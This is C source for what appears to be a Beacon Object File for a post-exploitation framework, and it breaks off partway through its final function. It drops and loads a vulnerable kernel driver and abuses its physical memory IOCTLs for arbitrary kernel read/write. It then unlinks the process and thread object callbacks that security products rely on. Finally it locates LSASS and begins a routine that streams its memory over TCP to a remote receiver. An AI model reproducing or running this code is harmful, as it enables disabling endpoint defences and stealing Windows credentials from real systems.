#include <winsock2.h>
#include <windows.h>
#include <tlhelp32.h>

typedef struct {
    char *original;
    char *buffer;
    int   length;
    int   size;
} datap;

DECLSPEC_IMPORT void  BeaconPrintf(int type, const char *fmt, ...);
DECLSPEC_IMPORT void  BeaconOutput(int type, char *data, int len);
DECLSPEC_IMPORT void  BeaconDataParse(datap *parser, char *buffer, int size);
DECLSPEC_IMPORT char *BeaconDataExtract(datap *parser, int *size);
DECLSPEC_IMPORT char *BeaconDataPtr(datap *parser, int size);
DECLSPEC_IMPORT int   BeaconDataInt(datap *parser);

DECLSPEC_IMPORT size_t MSVCRT$strlen(const char *);
DECLSPEC_IMPORT int    MSVCRT$memcmp(const void *, const void *, size_t);
#define strlen MSVCRT$strlen
#define memcmp MSVCRT$memcmp

#define CALLBACK_OUTPUT 0x00
#define CALLBACK_ERROR  0x0d

#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)

typedef struct {
    USHORT Length;
    USHORT MaximumLength;
    LPWSTR Buffer;
} USTR_W;


/* NTDLL functions resolved dynamically — Kassandra's BOF loader can't resolve ntdll */
typedef NTSTATUS (NTAPI *fnNtLoadDriver)(USTR_W *RegistryPath);
typedef NTSTATUS (NTAPI *fnNtUnloadDriver)(USTR_W *RegistryPath);
static fnNtLoadDriver   pNtLoadDriver;
static fnNtUnloadDriver pNtUnloadDriver;

DECLSPEC_IMPORT PVOID  WINAPI KERNEL32$GetProcessHeap(void);
DECLSPEC_IMPORT PVOID  WINAPI KERNEL32$HeapAlloc(PVOID Heap, DWORD Flags, SIZE_T Size);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$HeapFree(PVOID Heap, DWORD Flags, PVOID Base);

DECLSPEC_IMPORT void  *MSVCRT$memcpy(void *, const void *, size_t);
DECLSPEC_IMPORT void  *MSVCRT$memset(void *, int, size_t);

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileW(LPCWSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$WriteFile(HANDLE,LPCVOID,DWORD,LPDWORD,LPOVERLAPPED);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$DeleteFileW(LPCWSTR);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetTempPathW(DWORD,LPWSTR);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetCurrentProcessId(void);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentProcess(void);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$OpenProcessToken(HANDLE,DWORD,PHANDLE);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenProcess(DWORD,BOOL,DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$ReadProcessMemory(HANDLE,LPCVOID,LPVOID,SIZE_T,SIZE_T*);
DECLSPEC_IMPORT SIZE_T WINAPI KERNEL32$VirtualQueryEx(HANDLE,LPCVOID,PMEMORY_BASIC_INFORMATION,SIZE_T);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$K32EnumDeviceDrivers(LPVOID*,DWORD,LPDWORD);
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryExA(LPCSTR,HANDLE,DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$FreeLibrary(HMODULE);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE,LPCSTR);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$DeviceIoControl(HANDLE,DWORD,LPVOID,DWORD,LPVOID,DWORD,LPDWORD,LPOVERLAPPED);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD,DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$Process32FirstW(HANDLE,LPPROCESSENTRY32W);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$Process32NextW(HANDLE,LPPROCESSENTRY32W);
DECLSPEC_IMPORT int    WINAPI KERNEL32$MultiByteToWideChar(UINT,DWORD,LPCSTR,int,LPWSTR,int);
DECLSPEC_IMPORT int    WINAPI KERNEL32$WideCharToMultiByte(UINT,DWORD,LPCWSTR,int,LPSTR,int,LPCSTR,LPBOOL);

DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$LookupPrivilegeValueA(LPCSTR,LPCSTR,PLUID);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE,BOOL,PTOKEN_PRIVILEGES,DWORD,PTOKEN_PRIVILEGES,PDWORD);
DECLSPEC_IMPORT LONG WINAPI ADVAPI32$RegCreateKeyExW(HKEY,LPCWSTR,DWORD,LPWSTR,DWORD,REGSAM,LPSECURITY_ATTRIBUTES,PHKEY,LPDWORD);
DECLSPEC_IMPORT LONG WINAPI ADVAPI32$RegSetValueExW(HKEY,LPCWSTR,DWORD,DWORD,const BYTE*,DWORD);
DECLSPEC_IMPORT LONG WINAPI ADVAPI32$RegCloseKey(HKEY);
DECLSPEC_IMPORT LONG WINAPI ADVAPI32$RegDeleteKeyW(HKEY,LPCWSTR);

DECLSPEC_IMPORT int          WINAPI WS2_32$WSAStartup(WORD,WSADATA*);
DECLSPEC_IMPORT int          WINAPI WS2_32$WSACleanup(void);
DECLSPEC_IMPORT SOCKET       WINAPI WS2_32$socket(int,int,int);
DECLSPEC_IMPORT int          WINAPI WS2_32$connect(SOCKET,const struct sockaddr*,int);
DECLSPEC_IMPORT int          WINAPI WS2_32$send(SOCKET,const char*,int,int);
DECLSPEC_IMPORT int          WINAPI WS2_32$closesocket(SOCKET);
DECLSPEC_IMPORT unsigned long WINAPI WS2_32$inet_addr(const char*);
DECLSPEC_IMPORT unsigned short WINAPI WS2_32$htons(unsigned short);

/* Driver type enum: 0=BiosTool, 1=RtsPpx, 2=RwDrv */
#define DRV_BIOSTOOL 0
#define DRV_RTSPPX   1
#define DRV_RWDRV    2

/* BiosTool IOCTLs */
#define BIOSTOOL_READ_PHYS  0x22202Cu
#define BIOSTOOL_WRITE_PHYS 0x222030u
#define BIOSTOOL_VA2PA      0x222034u

/* RtsPpx IOCTLs */
#define RTSPPX_IOCTL_READ   0x222000u
#define RTSPPX_IOCTL_WRITE  0x222008u

/* RwDrv IOCTLs */
#define RWDRV_IOCTL_READ    0x80002000u
#define RWDRV_IOCTL_WRITE   0x80002004u

#define OBJ_TYPE_CALLBACK_LIST_OFF 0xC8
#define NT_EXPORT_DIR_OFF 0x88

typedef unsigned long long QWORD;

#pragma pack(push,1)
struct RtsPpx_ReadReq {
    QWORD physAddr;
    DWORD busNum;
    DWORD devNum;
    DWORD funNum;
    DWORD offset;
};
struct RtsPpx_WriteReq {
    QWORD physAddr;
    DWORD busNum;
    DWORD devNum;
    DWORD funNum;
    DWORD offset;
    BYTE  data;
};
struct RwDrv_RWReq {
    QWORD physAddr;
    DWORD size;
    DWORD reserved;
};
#pragma pack(pop)

static HANDLE  g_dev     = INVALID_HANDLE_VALUE;
static int     g_drvType = DRV_BIOSTOOL;
static QWORD   g_cr3     = 0;
static wchar_t g_svcName[64];
static wchar_t g_regPath[256];
static wchar_t g_drvPath[MAX_PATH];

static void bof_wcs_copy(wchar_t *dst, const wchar_t *src) {
    while ((*dst++ = *src++) != 0);
}
static void bof_wcs_cat(wchar_t *dst, const wchar_t *src) {
    while (*dst) dst++;
    while ((*dst++ = *src++) != 0);
}
static int bof_wcs_len(const wchar_t *s) {
    int n = 0; while (*s++) n++; return n;
}
static void bof_str_uint(unsigned int v, char *buf) {
    char tmp[12]; int i = 0;
    if (!v) { buf[0] = '0'; buf[1] = 0; return; }
    while (v) { tmp[i++] = '0' + (v % 10); v /= 10; }
    int j;
    for (j = 0; j < i; j++) buf[j] = tmp[i-1-j];
    buf[i] = 0;
}
static void bof_str_to_wcs(const char *src, wchar_t *dst, int max) {
    KERNEL32$MultiByteToWideChar(CP_UTF8, 0, src, -1, dst, max);
}
static void *bof_alloc(SIZE_T n) {
    return KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), 0, n);
}
static void bof_free(void *p) {
    if (p) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, p);
}
static void bof_memcpy(void *dst, const void *src, SIZE_T n) {
    MSVCRT$memcpy(dst, src, n);
}
static void bof_memset0(void *dst, SIZE_T n) {
    MSVCRT$memset(dst, 0, n);
}

static void EnablePriv(const char *name) {
    HANDLE hToken = NULL;
    if (!KERNEL32$OpenProcessToken(KERNEL32$GetCurrentProcess(),
                                   TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return;
    TOKEN_PRIVILEGES tp;
    bof_memset0(&tp, sizeof(tp));
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (ADVAPI32$LookupPrivilegeValueA(NULL, name, &tp.Privileges[0].Luid))
        ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    KERNEL32$CloseHandle(hToken);
}

static BOOL WriteDriver(const char *bytes, int len) {
    wchar_t tmpDir[MAX_PATH];
    DWORD pid = KERNEL32$GetCurrentProcessId();
    KERNEL32$GetTempPathW(MAX_PATH, tmpDir);

    char pidStr[16];
    bof_str_uint(pid, pidStr);

    bof_wcs_copy(g_drvPath, tmpDir);
    bof_wcs_cat(g_drvPath, L"bcd_");
    wchar_t wpid[16];
    bof_str_to_wcs(pidStr, wpid, 16);
    bof_wcs_cat(g_drvPath, wpid);
    bof_wcs_cat(g_drvPath, L".sys");

    HANDLE hf = KERNEL32$CreateFileW(g_drvPath, GENERIC_WRITE, 0, NULL,
                                     CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] WriteDriver CreateFile failed (%lu)\n",
                     KERNEL32$GetLastError());
        return FALSE;
    }
    DWORD written = 0;
    BOOL ok = KERNEL32$WriteFile(hf, bytes, (DWORD)len, &written, NULL);
    KERNEL32$CloseHandle(hf);
    if (!ok || written != (DWORD)len) {
        BeaconPrintf(CALLBACK_ERROR, "[-] WriteDriver WriteFile failed (%lu)\n",
                     KERNEL32$GetLastError());
        return FALSE;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Driver written to disk (%d bytes)\n", len);
    return TRUE;
}

static BOOL CreateSvcKey(void) {
    char pidStr[16];
    bof_str_uint(KERNEL32$GetCurrentProcessId(), pidStr);

    if (g_drvType == DRV_RTSPPX)
        bof_wcs_copy(g_svcName, L"RtsPpx_");
    else if (g_drvType == DRV_RWDRV)
        bof_wcs_copy(g_svcName, L"RwDrv_");
    else
        bof_wcs_copy(g_svcName, L"BiosTool_");

    wchar_t wpid[16];
    bof_str_to_wcs(pidStr, wpid, 16);
    bof_wcs_cat(g_svcName, wpid);

    bof_wcs_copy(g_regPath, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\");
    bof_wcs_cat(g_regPath, g_svcName);

    wchar_t keyPath[256];
    bof_wcs_copy(keyPath, L"SYSTEM\\CurrentControlSet\\Services\\");
    bof_wcs_cat(keyPath, g_svcName);

    HKEY hk = NULL;
    LONG rc = ADVAPI32$RegCreateKeyExW(HKEY_LOCAL_MACHINE, keyPath, 0, NULL,
                                       REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS,
                                       NULL, &hk, NULL);
    if (rc != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[-] RegCreateKeyEx failed (%ld)\n", rc);
        return FALSE;
    }

    wchar_t imgPath[MAX_PATH + 8];
    bof_wcs_copy(imgPath, L"\\??\\");
    bof_wcs_cat(imgPath, g_drvPath);

    DWORD type = 1, start = 3, err = 1;
    ADVAPI32$RegSetValueExW(hk, L"Type",         0, REG_DWORD, (BYTE*)&type,  sizeof(type));
    ADVAPI32$RegSetValueExW(hk, L"Start",        0, REG_DWORD, (BYTE*)&start, sizeof(start));
    ADVAPI32$RegSetValueExW(hk, L"ErrorControl", 0, REG_DWORD, (BYTE*)&err,   sizeof(err));
    ADVAPI32$RegSetValueExW(hk, L"ImagePath",    0, REG_EXPAND_SZ,
                            (BYTE*)imgPath, (DWORD)((bof_wcs_len(imgPath) + 1) * 2));
    ADVAPI32$RegCloseKey(hk);
    return TRUE;
}

static BOOL LoadDriver(void) {
    USTR_W us;
    us.Buffer        = g_regPath;
    us.Length        = (USHORT)(bof_wcs_len(g_regPath) * 2);
    us.MaximumLength = us.Length + 2;
    NTSTATUS st = pNtLoadDriver(&us);
    if (!NT_SUCCESS(st) && st != (LONG)0xC000010E) {
        BeaconPrintf(CALLBACK_ERROR, "[-] NtLoadDriver: 0x%08lX\n", (ULONG)st);
        return FALSE;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] NtLoadDriver: 0x%08lX\n", (ULONG)st);
    return TRUE;
}

static BOOL OpenDevice(void) {
    const char *devName;
    if (g_drvType == DRV_RTSPPX)
        devName = "\\\\.\\RtsPpx";
    else if (g_drvType == DRV_RWDRV)
        devName = "\\\\.\\fmem3";
    else
        devName = "\\\\.\\BiosToolCommonDriver";

    g_dev = KERNEL32$CreateFileA(devName,
                                 GENERIC_READ | GENERIC_WRITE, 0, NULL,
                                 OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (g_dev == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] OpenDevice '%s' failed (%lu)\n",
                     devName, KERNEL32$GetLastError());
        return FALSE;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Device open: %s\n", devName);
    return TRUE;
}

/* ============================================================================
 * BiosTool physical R/W (has VA2PA IOCTL)
 * ============================================================================ */
static PVOID BiosTool_Va2Pa(PVOID va) {
    struct { PVOID VA; PVOID PA; } req;
    req.VA = va; req.PA = NULL;
    DWORD ret = 0;
    KERNEL32$DeviceIoControl(g_dev, BIOSTOOL_VA2PA,
                             &req, sizeof(req), &req, sizeof(req), &ret, NULL);
    return req.PA;
}

static BOOL BiosTool_ReadPhys(PVOID pa, SIZE_T size, PVOID buf) {
    BYTE *pPA  = (BYTE*)pa;
    BYTE *pBuf = (BYTE*)buf;
    while (size > 0) {
        ULONG_PTR pageOff = (ULONG_PTR)pPA & 0xFFF;
        ULONG chunk = (ULONG)(size < (0x1000 - pageOff) ? size : (0x1000 - pageOff));
        struct { PVOID PA; ULONG Size; ULONG Pad; } req;
        req.PA = pPA; req.Size = chunk; req.Pad = 0;
        BYTE tmp[0x1008];
        DWORD got = 0;
        if (!KERNEL32$DeviceIoControl(g_dev, BIOSTOOL_READ_PHYS,
                                      &req, sizeof(req), tmp, sizeof(tmp), &got, NULL))
            return FALSE;
        bof_memcpy(pBuf, tmp + 8, chunk);
        pPA  += chunk;
        pBuf += chunk;
        size -= chunk;
    }
    return TRUE;
}

static BOOL BiosTool_WritePhys(PVOID pa, SIZE_T size, PVOID data) {
    BYTE *pPA   = (BYTE*)pa;
    BYTE *pData = (BYTE*)data;
    while (size > 0) {
        ULONG_PTR pageOff = (ULONG_PTR)pPA & 0xFFF;
        ULONG chunk = (ULONG)(size < (0x1000 - pageOff) ? size : (0x1000 - pageOff));
        struct { ULONG Size; ULONG Pad; PVOID Data; PVOID PA; } req;
        req.Size = chunk; req.Pad = 0; req.Data = pData; req.PA = pPA;
        DWORD got = 0;
        if (!KERNEL32$DeviceIoControl(g_dev, BIOSTOOL_WRITE_PHYS,
                                      &req, sizeof(req), &req, sizeof(req), &got, NULL))
            return FALSE;
        pPA   += chunk;
        pData += chunk;
        size  -= chunk;
    }
    return TRUE;
}

/* ============================================================================
 * RtsPpx physical R/W (byte-at-a-time write, page-at-a-time read)
 * ============================================================================ */
static BOOL RtsPpx_PhysRead(QWORD pa, PVOID buf, DWORD size) {
    if (size == 0) return TRUE;
    DWORD done = 0;
    while (done < size) {
        DWORD chunk = size - done;
        if (chunk > 0x1000) chunk = 0x1000;
        BYTE ioBuf[0x1100];
        bof_memset0(ioBuf, sizeof(ioBuf));
        struct RtsPpx_ReadReq *req = (struct RtsPpx_ReadReq *)ioBuf;
        req->physAddr = pa + done;
        req->busNum = 0;
        req->devNum = 0;
        req->funNum = 0;
        req->offset = 0;
        DWORD got = 0;
        BOOL ok = KERNEL32$DeviceIoControl(g_dev, RTSPPX_IOCTL_READ,
            ioBuf, sizeof(struct RtsPpx_ReadReq), ioBuf, sizeof(ioBuf), &got, NULL);
        if (!ok) return FALSE;
        DWORD take = chunk;
        if (got < take) take = got;
        bof_memcpy((BYTE*)buf + done, ioBuf, take);
        done += take;
        if (got < chunk) break;
    }
    return TRUE;
}

static BOOL RtsPpx_PhysWrite(QWORD pa, PVOID data, DWORD size) {
    if (size == 0) return TRUE;
    DWORD done = 0;
    while (done < size) {
        struct RtsPpx_WriteReq req;
        req.physAddr = pa + done;
        req.busNum = 0;
        req.devNum = 0;
        req.funNum = 0;
        req.offset = 0;
        req.data = *((BYTE*)data + done);
        DWORD got = 0;
        BOOL ok = KERNEL32$DeviceIoControl(g_dev, RTSPPX_IOCTL_WRITE,
            &req, sizeof(req), NULL, 0, &got, NULL);
        if (!ok) return FALSE;
        done += 1;
    }
    return TRUE;
}

/* ============================================================================
 * RwDrv physical R/W (page-at-a-time read, struct+data write)
 * ============================================================================ */
static BOOL RwDrv_PhysRead(QWORD pa, PVOID buf, DWORD size) {
    if (size == 0) return TRUE;
    DWORD done = 0;
    while (done < size) {
        DWORD chunk = size - done;
        if (chunk > 0x1000) chunk = 0x1000;
        struct RwDrv_RWReq req;
        req.physAddr = pa + done;
        req.size = chunk;
        req.reserved = 0;
        BYTE outBuf[0x1000];
        bof_memset0(outBuf, sizeof(outBuf));
        DWORD got = 0;
        BOOL ok = KERNEL32$DeviceIoControl(g_dev, RWDRV_IOCTL_READ,
            &req, sizeof(req), outBuf, chunk, &got, NULL);
        if (!ok) return FALSE;
        DWORD take = chunk;
        if (got < take) take = got;
        bof_memcpy((BYTE*)buf + done, outBuf, take);
        done += take;
        if (got < chunk) break;
    }
    return TRUE;
}

static BOOL RwDrv_PhysWrite(QWORD pa, PVOID data, DWORD size) {
    if (size == 0) return TRUE;
    DWORD done = 0;
    while (done < size) {
        DWORD chunk = size - done;
        if (chunk > 0x1000) chunk = 0x1000;
        BYTE ioBuf[0x1100];
        bof_memset0(ioBuf, sizeof(ioBuf));
        struct RwDrv_RWReq *req = (struct RwDrv_RWReq *)ioBuf;
        req->physAddr = pa + done;
        req->size = chunk;
        req->reserved = 0;
        bof_memcpy(ioBuf + sizeof(struct RwDrv_RWReq), (BYTE*)data + done, chunk);
        DWORD got = 0;
        BOOL ok = KERNEL32$DeviceIoControl(g_dev, RWDRV_IOCTL_WRITE,
            ioBuf, sizeof(struct RwDrv_RWReq) + chunk, NULL, 0, &got, NULL);
        if (!ok) return FALSE;
        done += chunk;
    }
    return TRUE;
}

/* ============================================================================
 * Generic physical R/W dispatch
 * ============================================================================ */
static BOOL PhysRead(QWORD pa, PVOID buf, DWORD size) {
    if (g_drvType == DRV_RTSPPX) return RtsPpx_PhysRead(pa, buf, size);
    if (g_drvType == DRV_RWDRV)  return RwDrv_PhysRead(pa, buf, size);
    return BiosTool_ReadPhys((PVOID)(ULONG_PTR)pa, size, buf);
}

static BOOL PhysWrite(QWORD pa, PVOID data, DWORD size) {
    if (g_drvType == DRV_RTSPPX) return RtsPpx_PhysWrite(pa, data, size);
    if (g_drvType == DRV_RWDRV)  return RwDrv_PhysWrite(pa, data, size);
    return BiosTool_WritePhys((PVOID)(ULONG_PTR)pa, size, data);
}

/* ============================================================================
 * CR3 page table walking (for RtsPpx + RwDrv that lack VA2PA IOCTL)
 * ============================================================================ */
static BOOL IsSafeAddr(QWORD pa) {
    if (pa < 0x400000) return FALSE;
    if (pa >= 0xA0000 && pa < 0x100000) return FALSE;
    if (pa >= 0xE0000000 && pa < 0x100000000ULL) return FALSE;
    if (pa >= 0xFEC00000 && pa < 0xFEF00000) return FALSE;
    if (pa >= 0xFF000000) return FALSE;
    return TRUE;
}

static QWORD FindCr3(void) {
    QWORD RAM_LIMIT = 0x200000000ULL;
    QWORD ranges[][2] = {
        { 0x400000ULL,   0x4000000ULL  },
        { 0x4000000ULL,  0x10000000ULL },
    };
    int r;
    for (r = 0; r < 2; r++) {
        QWORD pa;
        for (pa = ranges[r][0]; pa < ranges[r][1]; pa += 0x1000) {
            QWORD e0 = 0;
            if (!IsSafeAddr(pa)) continue;
            if (!PhysRead(pa, &e0, 8)) continue;
            if (!(e0 & 1) || (e0 & 0x80)) continue;
            QWORD pa0 = e0 & ~0xFFFULL;
            if (pa0 == 0 || pa0 >= RAM_LIMIT) continue;
            int i;
            for (i = 1; i < 512; i++) {
                QWORD entry = 0;
                if (!PhysRead(pa + (QWORD)i * 8, &entry, 8)) break;
                if ((entry & 1) && (entry & ~0xFFFULL) == pa)
                    return pa;
            }
        }
    }
    return 0;
}

static QWORD Cr3Va2Pa(QWORD va) {
    if (!g_cr3) return 0;
    QWORD pml4_idx = (va >> 39) & 0x1FF;
    QWORD pdpt_idx = (va >> 30) & 0x1FF;
    QWORD pd_idx   = (va >> 21) & 0x1FF;
    QWORD pt_idx   = (va >> 12) & 0x1FF;
    QWORD offset   = va & 0xFFF;

    QWORD pml4e = 0;
    PhysRead((g_cr3 & ~0xFFFULL) + pml4_idx * 8, &pml4e, 8);
    if (!(pml4e & 1)) return 0;

    QWORD pdpte = 0;
    PhysRead((pml4e & ~0xFFFULL) + pdpt_idx * 8, &pdpte, 8);
    if (!(pdpte & 1)) return 0;
    if (pdpte & (1ULL << 7))
        return (pdpte & ~0x3FFFFFFFULL) | (va & 0x3FFFFFFFULL);

    QWORD pde = 0;
    PhysRead((pdpte & ~0xFFFULL) + pd_idx * 8, &pde, 8);
    if (!(pde & 1)) return 0;
    if (pde & (1ULL << 7))
        return (pde & ~0x1FFFFFULL) | (va & 0x1FFFFFULL);

    QWORD pte = 0;
    PhysRead((pde & ~0xFFFULL) + pt_idx * 8, &pte, 8);
    if (!(pte & 1)) return 0;
    return (pte & ~0xFFFULL) | offset;
}

/* ============================================================================
 * Unified kernel R/W (dispatches per driver type)
 * ============================================================================ */
static BOOL KRead(QWORD va, PVOID buf, SIZE_T size) {
    BYTE *pBuf = (BYTE*)buf;
    while (size > 0) {
        ULONG_PTR off = (ULONG_PTR)(va & 0xFFF);
        ULONG chunk = (ULONG)(size < (0x1000 - off) ? size : (0x1000 - off));
        QWORD pa;
        if (g_drvType == DRV_BIOSTOOL) {
            PVOID p = BiosTool_Va2Pa((PVOID)(ULONG_PTR)va);
            if (!p) return FALSE;
            pa = (QWORD)(ULONG_PTR)p;
        } else {
            pa = Cr3Va2Pa(va);
            if (!pa) return FALSE;
        }
        if (!PhysRead(pa, pBuf, chunk)) return FALSE;
        va   += chunk;
        pBuf += chunk;
        size -= chunk;
    }
    return TRUE;
}

static BOOL KWrite(QWORD va, PVOID buf, SIZE_T size) {
    BYTE *pBuf = (BYTE*)buf;
    while (size > 0) {
        ULONG_PTR off = (ULONG_PTR)(va & 0xFFF);
        ULONG chunk = (ULONG)(size < (0x1000 - off) ? size : (0x1000 - off));
        QWORD pa;
        if (g_drvType == DRV_BIOSTOOL) {
            PVOID p = BiosTool_Va2Pa((PVOID)(ULONG_PTR)va);
            if (!p) return FALSE;
            pa = (QWORD)(ULONG_PTR)p;
        } else {
            pa = Cr3Va2Pa(va);
            if (!pa) return FALSE;
        }
        if (!PhysWrite(pa, pBuf, chunk)) return FALSE;
        va   += chunk;
        pBuf += chunk;
        size -= chunk;
    }
    return TRUE;
}

static QWORD KReadQ(QWORD va) {
    QWORD v = 0;
    KRead(va, &v, 8);
    return v;
}

/* ============================================================================
 * Kernel navigation helpers
 * ============================================================================ */
static QWORD FindNtosExport(QWORD ntosBase, const char *sym) {
    DWORD peOff = 0;
    KRead(ntosBase + 0x3C, &peOff, 4);
    if (!peOff || peOff > 0x1000) return 0;

    DWORD eDirRva = 0, numNames = 0, funcsRVA = 0, namesRVA = 0, ordsRVA = 0;
    KRead(ntosBase + peOff + NT_EXPORT_DIR_OFF, &eDirRva, 4);
    if (!eDirRva) return 0;
    QWORD eDir = ntosBase + eDirRva;
    KRead(eDir + 0x18, &numNames, 4);
    KRead(eDir + 0x1C, &funcsRVA, 4);
    KRead(eDir + 0x20, &namesRVA, 4);
    KRead(eDir + 0x24, &ordsRVA,  4);

    int targLen = 0;
    while (sym[targLen]) targLen++;

    DWORD i;
    for (i = 0; i < numNames && i < 100000; i++) {
        DWORD nameRVA = 0;
        KRead(ntosBase + namesRVA + (QWORD)i * 4, &nameRVA, 4);
        if (!nameRVA) continue;
        char buf[256];
        bof_memset0(buf, sizeof(buf));
        KRead(ntosBase + nameRVA, buf, (DWORD)(targLen + 2 < 255 ? targLen + 2 : 255));
        int match = 1;
        int j;
        for (j = 0; j < targLen; j++) {
            if (buf[j] != sym[j]) { match = 0; break; }
        }
        if (match && buf[targLen] == 0) {
            WORD  ord     = 0;
            DWORD funcRVA = 0;
            KRead(ntosBase + ordsRVA  + (QWORD)i * 2, &ord,     2);
            KRead(ntosBase + funcsRVA + (QWORD)ord * 4, &funcRVA, 4);
            return ntosBase + funcRVA;
        }
    }
    return 0;
}

static void UnlinkCallbackList(const char *typeName, QWORD listHead) {
    QWORD flink = KReadQ(listHead);
    if (!flink || flink == listHead) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] %s CallbackList already empty\n", typeName);
        return;
    }
    int seen = 0;
    QWORD entry = flink;
    while (entry && entry != listHead && seen < 64) {
        entry = KReadQ(entry);
        seen++;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Unlinking %d %s callback(s)...\n", seen, typeName);
    QWORD self = listHead;
    KWrite(listHead,     &self, 8);
    KWrite(listHead + 8, &self, 8);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] %s ObCallbacks unlinked\n", typeName);
}

static BOOL PatchObCallbacks(QWORD ntosBase) {
    QWORD procTypePtr = FindNtosExport(ntosBase, "PsProcessType");
    if (!procTypePtr) {
        BeaconPrintf(CALLBACK_ERROR, "[-] PsProcessType not found\n");
        return FALSE;
    }
    QWORD procObjType = KReadQ(procTypePtr);
    if (!procObjType) {
        BeaconPrintf(CALLBACK_ERROR, "[-] *PsProcessType NULL\n");
        return FALSE;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] OBJECT_TYPE(Process): 0x%llX\n",
                 (unsigned long long)procObjType);
    UnlinkCallbackList("Process", procObjType + OBJ_TYPE_CALLBACK_LIST_OFF);

    QWORD threadTypePtr = FindNtosExport(ntosBase, "PsThreadType");
    if (threadTypePtr) {
        QWORD threadObjType = KReadQ(threadTypePtr);
        if (threadObjType) {
            BeaconPrintf(CALLBACK_OUTPUT, "[*] OBJECT_TYPE(Thread): 0x%llX\n",
                         (unsigned long long)threadObjType);
            UnlinkCallbackList("Thread", threadObjType + OBJ_TYPE_CALLBACK_LIST_OFF);
        }
    }
    return TRUE;
}

static QWORD GetNtosBase(void) {
    LPVOID drvs[1024];
    DWORD cb = 0;
    if (!KERNEL32$K32EnumDeviceDrivers(drvs, sizeof(drvs), &cb)) return 0;
    return (QWORD)drvs[0];
}

static QWORD PsISPOffset(void) {
    HMODULE ntos = KERNEL32$LoadLibraryExA("ntoskrnl.exe", NULL,
                                           DONT_RESOLVE_DLL_REFERENCES);
    if (!ntos) return 0;
    FARPROC p = KERNEL32$GetProcAddress(ntos, "PsInitialSystemProcess");
    QWORD off = p ? ((QWORD)(ULONG_PTR)p - (QWORD)(ULONG_PTR)ntos) : 0;
    KERNEL32$FreeLibrary(ntos);
    return off;
}

/* ============================================================================
 * LSASS PID lookup
 * ============================================================================ */
static DWORD FindLsassPid(void) {
    HANDLE snap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe;
    bof_memset0(&pe, sizeof(pe));
    pe.dwSize = sizeof(pe);
    DWORD pid = 0;
    if (KERNEL32$Process32FirstW(snap, &pe)) {
        do {
            char nm[MAX_PATH];
            KERNEL32$WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1,
                                         nm, MAX_PATH, NULL, NULL);
            const char *a = nm, *b = "lsass.exe";
            int eq = 1;
            while (*a && *b) {
                char ca = (*a >= 'A' && *a <= 'Z') ? *a + 32 : *a;
                char cb = (*b >= 'A' && *b <= 'Z') ? *b + 32 : *b;
                if (ca != cb) { eq = 0; break; }
                a++; b++;
            }
            if (eq && !*a && !*b) { pid = pe.th32ProcessID; break; }
        } while (KERNEL32$Process32NextW(snap, &pe));
    }
    KERNEL32$CloseHandle(snap);
    return pid;
}

/* ============================================================================
 * DumpRpm + TCP exfil (streams directly - no dump file on disk)
 * ============================================================================ */
static int SendAll(SOCKET sock, const char *buf, int len) {
    int sent = 0;
    while (sent < len) {
        int n = WS2_32$send(sock, buf + sent, len - sent, 0);
        if (n <= 0) return -1;
        sent += n;
    }
    return sent;
}

static BOOL DumpAndSend(DWORD pid, const char *recvIp, int recvPort) {
    EnablePriv("SeDebugPrivilege");

    HANDLE hProc = KERNEL32$OpenProcess(
